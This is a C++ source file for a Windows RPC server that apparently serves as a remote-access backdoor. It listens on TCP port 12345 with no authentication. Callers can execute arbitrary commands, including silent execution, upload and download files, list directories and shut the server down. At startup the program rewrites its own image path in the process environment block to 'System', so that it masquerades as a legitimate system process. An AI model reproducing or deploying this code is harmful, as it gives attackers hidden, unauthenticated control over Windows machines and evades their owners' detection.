#include "Server.h"
#include "Exec.h"
#include "fs.h"
#include "..\RPCMotion\MyInterface_h.h"
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "ntdll.lib")

DWORD Ping(
    handle_t hBinding,
    wchar_t** response
) {
    std::wstring pingResponse = L"PONG_OK";

    int sizeNeeded = pingResponse.length() + 1;
    *response = (wchar_t*)midl_user_allocate(sizeNeeded * sizeof(wchar_t));

    if (*response == NULL) {
        return ERROR_NOT_ENOUGH_MEMORY;
    }

    wcscpy_s(*response, sizeNeeded, pingResponse.c_str());
    return ERROR_SUCCESS;
}

DWORD Execute(
    handle_t hBinding,
    wchar_t* input,
    wchar_t** output
) {
    if (input == NULL) {
        return ERROR_INVALID_PARAMETER;
    }

    std::wstring result;
    DWORD exitCode = ExecuteCommand(input, result, false);

    int sizeNeeded = result.length() + 1;
    *output = (wchar_t*)midl_user_allocate(sizeNeeded * sizeof(wchar_t));

    if (*output == NULL) {
        return ERROR_NOT_ENOUGH_MEMORY;
    }

    wcscpy_s(*output, sizeNeeded, result.c_str());
    return exitCode;
}

DWORD ExecuteSilent(
    handle_t hBinding,
    wchar_t* input
) {
    if (input == NULL) {
        return ERROR_INVALID_PARAMETER;
    }

    std::wstring dummy;
    return ExecuteCommand(input, dummy, true);
}

DWORD UploadFile(
    handle_t hBinding,
    wchar_t* remotePath,
    DWORD fileSize,
    byte fileData[]
) {
    return UploadFileContent(remotePath, fileData, fileSize);
}

DWORD DownloadFile(
    handle_t hBinding,
    wchar_t* remotePath,
    DWORD* fileSize,
    byte** fileData
) {
    return DownloadFileContent(remotePath, fileData, fileSize);
}

DWORD ListDirectory(
    handle_t hBinding,
    wchar_t* path,
    wchar_t** output
) {
    std::wstring result;
    DWORD status = ListDirectoryContents(path, result);

    if (status != ERROR_SUCCESS) {
        return status;
    }

    int sizeNeeded = result.length() + 1;
    *output = (wchar_t*)midl_user_allocate(sizeNeeded * sizeof(wchar_t));

    if (*output == NULL) {
        return ERROR_NOT_ENOUGH_MEMORY;
    }

    wcscpy_s(*output, sizeNeeded, result.c_str());
    return ERROR_SUCCESS;
}

VOID ShutDown(
    handle_t hBinding
) {
    RPC_STATUS status;
    status = RpcMgmtStopServerListening(NULL);

    if (status)
        exit(status);

    status = RpcServerUnregisterIf(
        NULL,
        NULL,
        FALSE
    );

    if (status)
        exit(status);
}

std::wstring SetProcessModuleName(const std::wstring& newName) {
    HANDLE hProcess = GetCurrentProcess();

    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG retLen = 0;
    NTSTATUS status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &retLen
    );

    if (!NT_SUCCESS(status)) {
        CloseHandle(hProcess);
        throw std::runtime_error("Failed to query process information");
    }

    PEB* peb = pbi.PebBaseAddress;
    if (!peb) {
        CloseHandle(hProcess);
        throw std::runtime_error("Invalid PEB address");
    }

    SIZE_T bytesRead = 0;
    PVOID processParameters = nullptr;
    if (!ReadProcessMemory(
        hProcess,
        &peb->ProcessParameters,
        &processParameters,
        sizeof(processParameters),
        &bytesRead
    )) {
        CloseHandle(hProcess);
        throw std::runtime_error("Failed to read process parameters");
    }

    UNICODE_STRING imagePathName = { 0 };
    PVOID imagePathNameOffset = (PBYTE)processParameters + 0x60;
    if (!ReadProcessMemory(
        hProcess,
        imagePathNameOffset,
        &imagePathName,
        sizeof(imagePathName),
        &bytesRead
    )) {
        CloseHandle(hProcess);
        throw std::runtime_error("Failed to read image path name");
    }

    std::vector<wchar_t> oldNameBuffer(imagePathName.Length / sizeof(wchar_t) + 1);
    if (!ReadProcessMemory(
        hProcess,
        imagePathName.Buffer,
        oldNameBuffer.data(),
        imagePathName.Length,
        &bytesRead
    )) {
        CloseHandle(hProcess);
        throw std::runtime_error("Failed to read current module name");
    }
    oldNameBuffer[imagePathName.Length / sizeof(wchar_t)] = L'\0';
    std::wstring oldName(oldNameBuffer.data());

    std::vector<BYTE> newNameBytes((newName.size() + 1) * sizeof(wchar_t));
    memcpy(newNameBytes.data(), newName.c_str(), newName.size() * sizeof(wchar_t));
    newNameBytes[newName.size() * sizeof(wchar_t)] = L'\0';
    newNameBytes[(newName.size() + 1) * sizeof(wchar_t) - 1] = L'\0';

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(
        hProcess,
        imagePathName.Buffer,
        newNameBytes.data(),
        newNameBytes.size(),
        &bytesWritten
    )) {
        CloseHandle(hProcess);
        throw std::runtime_error("Failed to write new module name");
    }

    CloseHandle(hProcess);
    return oldName;
}

int main() {
    setlocale(LC_ALL, "");

    try {
        std::wstring oldName = SetProcessModuleName(L"System");
        std::wcout << L"[*] Old name was: " << oldName << std::endl;
    }
    catch (const std::exception& e) {
        std::wcerr << L"Error: " << e.what() << std::endl;
    }

    handle_t hBinding = NULL;
    RPC_STATUS rpcStatus;
    RPC_WSTR pszProtSeq = (RPC_WSTR)L"ncacn_ip_tcp";
    RPC_WSTR pszTCPPort = (RPC_WSTR)L"12345";

    rpcStatus = RpcServerUseProtseqEp(
        pszProtSeq,
        RPC_C_PROTSEQ_MAX_REQS_DEFAULT,
        pszTCPPort,
        NULL
    );

    if (rpcStatus) {
        exit(rpcStatus);
    }

    rpcStatus = RpcServerRegisterIf2(
        MyRpcInterface_v1_0_s_ifspec,
        NULL,
        NULL,
        RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH,
        0,
        RPC_C_LISTEN_MAX_CALLS_DEFAULT,
        NULL);

    if (rpcStatus) {
        exit(rpcStatus);
    }

    rpcStatus = RpcServerListen(
        1,
        RPC_C_LISTEN_MAX_CALLS_DEFAULT,
        FALSE);

    if (rpcStatus) {
        exit(rpcStatus);
    }

    return 0;
}

void* midl_user_allocate(size_t len) {
    return malloc(len);
}

void midl_user_free(void* ptr) {
    free(ptr);
}